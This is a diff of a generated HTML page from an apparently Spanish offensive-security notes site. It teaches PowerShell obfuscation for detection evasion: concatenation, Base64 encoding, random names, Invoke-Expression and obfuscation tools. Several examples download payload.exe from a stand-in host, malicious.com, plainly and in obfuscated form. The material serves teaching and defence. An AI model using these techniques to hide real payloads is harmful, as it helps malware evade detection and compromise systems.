@@ -19,7 +19,7 @@
       
       
       <link rel="icon" href="../../assets/images/favicon.png">
-      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.7">
     
     
       
@@ -27,7 +27,7 @@
       
     
     
-      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      <link rel="stylesheet" href="../../assets/stylesheets/main.ec1eaa64.min.css">
       
         
         <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
@@ -307,6 +307,10 @@
       
         
       
+        
+      
+        
+      
     
     
     
@@ -423,6 +427,62 @@
     
   
     CVE-2026-42980 WMI Underflow (ES)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../bin-exploitation/binary-gecko-academy/cve-2019-11707-firefox-ionmonkey-to-system-en/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CVE-2019-11707 Firefox to SYSTEM (EN)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../bin-exploitation/binary-gecko-academy/cve-2019-11707-firefox-ionmonkey-to-system-es/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CVE-2019-11707 Firefox a SYSTEM (ES)
   
 
     
@@ -1608,7 +1668,7 @@
 <p>Divide comandos o cadenas en fragmentos que se unen en tiempo de ejecución, evitando que aparezcan palabras clave completas en el código.</p>
 <ul>
 <li><strong>Ejemplo:</strong>
-  <div class="language-powershell highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="nv">$cmd</span> <span class="p">=</span> <span class="s1">&#39;G&#39;</span> <span class="p">+</span> <span class="s1">&#39;et-&#39;</span> <span class="p">+</span> <span class="s1">&#39;Process&#39;</span>
+  <div class="language-powershell highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="nv">$cmd</span> <span class="p">=</span> <span class="s1">'G'</span> <span class="p">+</span> <span class="s1">'et-'</span> <span class="p">+</span> <span class="s1">'Process'</span>
 </span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="p">&amp;</span> <span class="nv">$cmd</span>
 </span></code></pre></div></li>
 <li><strong>Ventaja:</strong> Dificulta la identificación de comandos como <code>Get-Process</code>.</li>
@@ -1617,7 +1677,7 @@
 <p>Codifica el script o partes de él, como en Base64, para ocultar su contenido legible.</p>
 <ul>
 <li><strong>Ejemplo:</strong>
-  <div class="language-powershell highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="nv">$encoded</span> <span class="p">=</span> <span class="no">[Convert]</span><span class="p">::</span><span class="n">ToBase64String</span><span class="p">(</span><span class="no">[Text.Encoding]</span><span class="p">::</span><span class="n">Unicode</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="s1">&#39;Get-Process&#39;</span><span class="p">))</span>
+  <div class="language-powershell highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="nv">$encoded</span> <span class="p">=</span> <span class="no">[Convert]</span><span class="p">::</span><span class="n">ToBase64String</span><span class="p">(</span><span class="no">[Text.Encoding]</span><span class="p">::</span><span class="n">Unicode</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="s1">'Get-Process'</span><span class="p">))</span>
 </span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="n">powershell</span> <span class="n">-EncodedCommand</span> <span class="nv">$encoded</span>
 </span></code></pre></div></li>
 <li><strong>Ventaja:</strong> El script no es legible sin decodificación previa.</li>
@@ -1626,7 +1686,7 @@
 <p>Reemplaza nombres de variables o funciones con cadenas generadas aleatoriamente.</p>
 <ul>
 <li><strong>Ejemplo:</strong>
-  <div class="language-powershell highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="nv">$x7k9p2</span> <span class="p">=</span> <span class="s1">&#39;http://malicious.com&#39;</span>
+  <div class="language-powershell highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="nv">$x7k9p2</span> <span class="p">=</span> <span class="s1">'http://malicious.com'</span>
 </span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="nb">Invoke-WebRequest</span> <span class="n">-Uri</span> <span class="nv">$x7k9p2</span>
 </span></code></pre></div></li>
 <li><strong>Ventaja:</strong> Evita coincidencias con nombres comunes en firmas de detección.</li>
@@ -1635,7 +1695,7 @@
 <p>Usa <code>Invoke-Expression</code> para ejecutar código generado en tiempo de ejecución, ocultando la lógica principal.</p>
 <ul>
 <li><strong>Ejemplo:</strong>
-  <div class="language-powershell highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="nv">$code</span> <span class="p">=</span> <span class="s1">&#39;Get-&#39;</span> <span class="p">+</span> <span class="s1">&#39;Process&#39;</span>
+  <div class="language-powershell highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="nv">$code</span> <span class="p">=</span> <span class="s1">'Get-'</span> <span class="p">+</span> <span class="s1">'Process'</span>
 </span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="nb">Invoke-Expression</span> <span class="nv">$code</span>
 </span></code></pre></div></li>
 <li><strong>Ventaja:</strong> El código malicioso no está explícito en el script.</li>
@@ -1652,7 +1712,7 @@
 <p>Aprovecha la flexibilidad de PowerShell para escribir comandos de forma no convencional.</p>
 <ul>
 <li><strong>Ejemplo:</strong>
-  <div class="language-powershell highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="nb">Get-Process</span> <span class="p">|</span> <span class="p">?</span> <span class="p">{</span> <span class="nv">$_</span><span class="p">.</span><span class="n">Name</span> <span class="o">-eq</span> <span class="s1">&#39;explorer&#39;</span> <span class="p">}</span>
+  <div class="language-powershell highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="nb">Get-Process</span> <span class="p">|</span> <span class="p">?</span> <span class="p">{</span> <span class="nv">$_</span><span class="p">.</span><span class="n">Name</span> <span class="o">-eq</span> <span class="s1">'explorer'</span> <span class="p">}</span>
 </span></code></pre></div></li>
 <li><strong>Ventaja:</strong> Complica la lectura automática del script.</li>
 </ul>
@@ -1662,7 +1722,7 @@
 <li><strong>Invoke-Obfuscation</strong>: Automatiza la aplicación de múltiples técnicas de ofuscación.</li>
 <li><strong>Uso Básico:</strong>
     <div class="language-powershell highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="nb">Import-Module</span> <span class="nb">Invoke-Obfuscation</span><span class="p">.</span><span class="n">psd1</span>
-</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="nb">Invoke-Obfuscation</span> <span class="n">-ScriptPath</span> <span class="s1">&#39;script.ps1&#39;</span> <span class="n">-OutputPath</span> <span class="s1">&#39;obfuscated.ps1&#39;</span>
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="nb">Invoke-Obfuscation</span> <span class="n">-ScriptPath</span> <span class="s1">'script.ps1'</span> <span class="n">-OutputPath</span> <span class="s1">'obfuscated.ps1'</span>
 </span></code></pre></div></li>
 <li>
 <p><strong>Recurso:</strong> <a href="https://github.com/danielbohannon/Invoke-Obfuscation">GitHub</a></p>
@@ -1672,7 +1732,7 @@
 </li>
 <li><strong>Uso Básico:</strong>
     <div class="language-powershell highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="nb">Import-Module</span> <span class="n">PSDuck</span><span class="p">.</span><span class="n">psm1</span>
-</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="n">PSDuck</span> <span class="n">-ScriptPath</span> <span class="s1">&#39;script.ps1&#39;</span> <span class="n">-OutputPath</span> <span class="s1">&#39;obfuscated.ps1&#39;</span>
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="n">PSDuck</span> <span class="n">-ScriptPath</span> <span class="s1">'script.ps1'</span> <span class="n">-OutputPath</span> <span class="s1">'obfuscated.ps1'</span>
 </span></code></pre></div></li>
 <li>
 <p><strong>Recurso:</strong> <a href="https://github.com/PSDuck/PSDuck">GitHub</a></p>
@@ -1686,13 +1746,13 @@
 <h2 id="ejemplos-practicos">Ejemplos Prácticos<a class="headerlink" href="#ejemplos-practicos" title="Permanent link">&para;</a></h2>
 <h3 id="concatenacion-de-cadenas">Concatenación de Cadenas<a class="headerlink" href="#concatenacion-de-cadenas" title="Permanent link">&para;</a></h3>
 <div class="language-powershell highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="c"># Original</span>
-</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="nb">Invoke-WebRequest</span> <span class="n">-Uri</span> <span class="s1">&#39;http://malicious.com/payload.exe&#39;</span> <span class="n">-OutFile</span> <span class="s1">&#39;payload.exe&#39;</span>
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="nb">Invoke-WebRequest</span> <span class="n">-Uri</span> <span class="s1">'http://malicious.com/payload.exe'</span> <span class="n">-OutFile</span> <span class="s1">'payload.exe'</span>
 </span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>
 </span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="c"># Ofuscado</span>
-</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a><span class="nv">$part1</span> <span class="p">=</span> <span class="s1">&#39;Invoke-Web&#39;</span>
-</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a><span class="nv">$part2</span> <span class="p">=</span> <span class="s1">&#39;Request&#39;</span>
-</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a><span class="nv">$uri</span> <span class="p">=</span> <span class="s1">&#39;http://&#39;</span> <span class="p">+</span> <span class="s1">&#39;malicious&#39;</span> <span class="p">+</span> <span class="s1">&#39;.com/payload.exe&#39;</span>
-</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a><span class="nv">$out</span> <span class="p">=</span> <span class="s1">&#39;pay&#39;</span> <span class="p">+</span> <span class="s1">&#39;load.exe&#39;</span>
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a><span class="nv">$part1</span> <span class="p">=</span> <span class="s1">'Invoke-Web'</span>
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a><span class="nv">$part2</span> <span class="p">=</span> <span class="s1">'Request'</span>
+</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a><span class="nv">$uri</span> <span class="p">=</span> <span class="s1">'http://'</span> <span class="p">+</span> <span class="s1">'malicious'</span> <span class="p">+</span> <span class="s1">'.com/payload.exe'</span>
+</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a><span class="nv">$out</span> <span class="p">=</span> <span class="s1">'pay'</span> <span class="p">+</span> <span class="s1">'load.exe'</span>
 </span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a><span class="p">&amp;</span> <span class="p">(</span><span class="nv">$part1</span> <span class="p">+</span> <span class="nv">$part2</span><span class="p">)</span> <span class="n">-Uri</span> <span class="nv">$uri</span> <span class="n">-OutFile</span> <span class="nv">$out</span>
 </span></code></pre></div>
 <h3 id="codificacion-base64">Codificación Base64<a class="headerlink" href="#codificacion-base64" title="Permanent link">&para;</a></h3>
@@ -1700,16 +1760,16 @@
 </span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="nb">Get-Process</span>
 </span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>
 </span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a><span class="c"># Ofuscado</span>
-</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a><span class="nv">$encoded</span> <span class="p">=</span> <span class="no">[Convert]</span><span class="p">::</span><span class="n">ToBase64String</span><span class="p">(</span><span class="no">[Text.Encoding]</span><span class="p">::</span><span class="n">Unicode</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="s1">&#39;Get-Process&#39;</span><span class="p">))</span>
+</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a><span class="nv">$encoded</span> <span class="p">=</span> <span class="no">[Convert]</span><span class="p">::</span><span class="n">ToBase64String</span><span class="p">(</span><span class="no">[Text.Encoding]</span><span class="p">::</span><span class="n">Unicode</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="s1">'Get-Process'</span><span class="p">))</span>
 </span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a><span class="n">powershell</span> <span class="n">-EncodedCommand</span> <span class="nv">$encoded</span>
 </span></code></pre></div>
 <h3 id="variables-aleatorias">Variables Aleatorias<a class="headerlink" href="#variables-aleatorias" title="Permanent link">&para;</a></h3>
 <div class="language-powershell highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="c"># Original</span>
-</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="nv">$url</span> <span class="p">=</span> <span class="s1">&#39;http://malicious.com&#39;</span>
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="nv">$url</span> <span class="p">=</span> <span class="s1">'http://malicious.com'</span>
 </span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="nb">Invoke-WebRequest</span> <span class="n">-Uri</span> <span class="nv">$url</span>
 </span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>
 </span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="c"># Ofuscado</span>
-</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a><span class="nv">$z9m4q1</span> <span class="p">=</span> <span class="s1">&#39;http://malicious.com&#39;</span>
+</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a><span class="nv">$z9m4q1</span> <span class="p">=</span> <span class="s1">'http://malicious.com'</span>
 </span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a><span class="nb">Invoke-WebRequest</span> <span class="n">-Uri</span> <span class="nv">$z9m4q1</span>
 </span></code></pre></div>
 <hr />
@@ -1799,7 +1859,7 @@
       <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.instant", "navigation.instant.progress", "navigation.sections", "navigation.top", "navigation.tracking", "navigation.indexes", "toc.integrate", "content.code.copy", "content.action.edit", "content.tabs.link"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copiado al portapapeles", "clipboard.copy": "Copiar al portapapeles", "search.result.more.one": "1 m\u00e1s en esta p\u00e1gina", "search.result.more.other": "# m\u00e1s en esta p\u00e1gina", "search.result.none": "No se encontraron documentos", "search.result.one": "1 documento encontrado", "search.result.other": "# documentos encontrados", "search.result.placeholder": "Teclee para comenzar b\u00fasqueda", "search.result.term.missing": "Falta", "select.version": "Seleccionar versi\u00f3n"}, "version": null}</script>
     
     
-      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      <script src="../../assets/javascripts/bundle.d7400e89.min.js"></script>
       
     
   </body>
